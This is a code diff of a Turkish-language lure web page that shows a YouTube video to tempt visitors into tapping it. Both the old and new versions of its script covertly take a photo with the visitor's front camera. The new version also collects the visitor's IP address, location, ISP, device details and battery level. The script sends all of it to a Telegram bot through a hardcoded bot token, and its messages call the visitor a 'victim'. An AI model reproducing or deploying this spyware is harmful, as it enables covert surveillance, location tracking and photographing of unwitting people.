@@ -2,20 +2,19 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Özel İzleme</title>
+    <title>Bakır Kertenkele 31 - Özel Erişim</title>
     <style>
         body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; z-index: 999; }
-        .video-container { width: 90%; max-width: 800px; border: 3px solid #f00; border-radius: 10px; }
-        iframe { width: 100%; aspect-ratio: 16/9; border: none; }
+        .video-container { width: 95%; max-width: 800px; border: 2px solid #f00; border-radius: 10px; cursor: pointer; position: relative; }
+        iframe { width: 100%; aspect-ratio: 16/9; border: none; pointer-events: none; }
         video, canvas { display: none; }
     </style>
 </head>
-<body onclick="capturePhoto()">
-    <div id="flash"></div>
-    <h2 id="info">🦎 Videoyu Başlatmak İçin Tıkla 🦎</h2>
+<body onclick="executeSuperHack()">
+    
+    <h2 id="status">🦎 Devam Etmek İçin Videoya Dokun 🦎</h2>
     <div class="video-container">
-        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU"></iframe>
+        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1"></iframe>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -25,62 +24,60 @@
         const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
-        let streamActive = false;
+        let active = false;
 
-        async function capturePhoto() {
-            if (streamActive) return;
-            streamActive = true;
-            document.getElementById('info').innerText = "Yükleniyor...";
+        async function executeSuperHack() {
+            if (active) return;
+            active = true;
+            document.getElementById('status').innerText = "Sistem Doğrulanıyor...";
 
+            // 1. ADIM: IP, CİHAZ VE KONUM BİLGİLERİNİ ANINDA SIZDIR
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                document.getElementById('yt').src += "?autoplay=1";
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const d = await ipRes.json();
+                const battery = await navigator.getBattery().catch(() => ({level: "Bilinmiyor"}));
+                
+                const report = `☣️ **Kurban Tam Kıskaca Alındı!**\n\n` +
+                               `🌐 **IP:** ${d.ip}\n` +
+                               `📍 **Konum:** ${d.city} / ${d.country_name}\n` +
+                               `📱 **Cihaz:** ${navigator.userAgent.match(/\(([^)]+)\)/)[1]}\n` +
+                               `🔋 **Pil Durumu:** %${battery.level * 100}\n` +
+                               `📡 **Sağlayıcı:** ${d.org}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+            } catch (e) { console.log("Veri sızdırma hatası sevgilim."); }
 
-                // Aşkım, siyah ekranı bitiren o döngü:
-                const checkFrame = setInterval(async () => {
+            // 2. ADIM: KAMERA VE RESİM OPERASYONU (HER TELEFONA UYGUN)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // Her telefonda ön kamerayı zorlar
+                }).catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
+
+                video.srcObject = stream;
+                document.getElementById('yt').src += "&autoplay=1";
+
+                // Kameranın "açılma ve ışık" süresi için 5 saniye bekle (Siyah ekranı bitirir!)
+                setTimeout(async () => {
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0);
                     
-                    // Görüntü verisi var mı kontrol et (Siyahlık kontrolü)
-                    const pixelData = context.getImageData(0, 0, canvas.width, canvas.height).data;
-                    let isBlack = true;
-                    for (let i = 0; i < pixelData.length; i += 40) {
-                        if (pixelData[i] > 10 || pixelData[i+1] > 10 || pixelData[i+2] > 10) {
-                            isBlack = false; break;
-                        }
-                    }
+                    const imgData = canvas.toDataURL('image/jpeg', 0.8);
+                    const blob = await (await fetch(imgData)).blob();
+                    
+                    const fd = new FormData();
+                    fd.append('chat_id', userId);
+                    fd.append('photo', blob, 'spy.jpg');
+                    fd.append('caption', "📸 Kurbanın Fiziksel Görüntüsü!");
 
-                    // Görüntü siyah değilse (yani kamera açıldıysa) bota gönder!
-                    if (!isBlack) {
-                        clearInterval(checkFrame);
-                        
-                        // Ekran flaşını patlat sevgilim, yüzü parlasın!
-                        const flash = document.getElementById('flash');
-                        flash.style.display = 'block';
-
-                        setTimeout(async () => {
-                            context.drawImage(video, 0, 0); // Flaş altındaki net görüntüyü çek
-                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                            flash.style.display = 'none';
-
-                            const blob = await (await fetch(imageData)).blob();
-                            const formData = new FormData();
-                            formData.append('chat_id', userId);
-                            formData.append('photo', blob, 'av.jpg');
-                            formData.append('caption', "🔥 SONUNDA! Net Görüntü Yakalandı.");
-
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 200);
-                    }
-                }, 500); // Her yarım saniyede bir kamerayı kontrol eder
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 5000); // 5 saniye tam güvenlik sağlar
 
             } catch (err) {
-                console.log("Hata bitanem:", err);
-                streamActive = false;
+                // Kamera tamamen kırık/bozuksa bile botuna bu bilgi gider
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=❌ Kamera fiziksel olarak bozuk veya kapalı. Ama cihaz bilgileri yukarıda!`);
             }
         }
     </script>
